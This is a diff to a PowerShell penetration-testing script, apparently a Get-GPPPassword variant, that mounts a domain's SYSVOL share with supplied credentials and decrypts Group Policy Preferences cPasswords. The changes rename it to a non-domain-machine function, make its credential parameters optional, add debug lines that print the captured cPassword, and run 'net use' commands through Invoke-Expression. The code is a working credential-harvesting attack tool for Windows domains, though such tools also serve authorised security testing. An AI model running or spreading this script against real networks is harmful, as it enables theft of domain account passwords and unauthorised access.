@@ -58,19 +58,20 @@
     http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
     http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
 #>
-    
+Function  Get-GPPPasswordNonDomainMachine
+{
     [CmdletBinding()]
     Param 
 	(
-		[Parameter(Mandatory=$true,
+		[Parameter(Mandatory=$false,
 		HelpMessage='Provide the target domain (or a domain controller IP)')]
 		[string]$Domain,
 		
-		[Parameter(Mandatory=$true,
+		[Parameter(Mandatory=$false,
 		HelpMessage='Provide the domain\username (no need to provide domain if account is in domain specified in -Domain), example: -Username domain\user1')]
 		[string]$UserName,
 		
-		[Parameter(Mandatory=$true,
+		[Parameter(Mandatory=$false,
 		HelpMessage='Provide the user password, example -Password P@ssw0rd')]
 		[string]$Password,
 		
@@ -217,8 +218,10 @@
 #Decrypt a single CPassword (or array)
 if ($Cpassword)
 {
+	Write-Host "$CPassword"
 	foreach ($Pass in $Cpassword) {
-               Write-Verbose "Decrypting $Pass"
+               Write-Host "number 2 is $CPassword"
+			   Write-Verbose "Decrypting $Pass"
                $DecryptedPassword = Get-DecryptedCpassword $Pass
                Write-Verbose "Decrypted a password of $DecryptedPassword"
                #append any new passwords to array
@@ -246,8 +249,10 @@ elseif ($UserName -and $Password)
 {
 	
 		#Mount the remote share using the provided credentials
-        $NetUseAuth = "net use \\$Domain" + "\SYSVOL" + " /USER:`"$UserName`" " + "`"$Password`""
-		Write-Host "Command: $NetUseAuth"
+        $NetUseDel = "net use \\$Domain /DEL /Y"
+		$NetUseAuth = "net use \\$Domain" + "\SYSVOL" + " /USER:`"$UserName`" " + "`"$Password`""
+		#Write-Host "Command: $NetUseAuth"
+		Invoke-Expression $NetUseDel
 		Invoke-Expression $NetUseAuth
 		Write-Host "Last Exit Code $LASTEXITCODE"
 		#Net use often provides weird errors, LASTEXITCODE 0 generally means success, try catch can mess net use up, and prematurely catch errors
@@ -277,4 +282,5 @@ else
 {
 	Write-Host "Incorrect paramater usage, please see help file"
 	break;
-}  
+}
+}
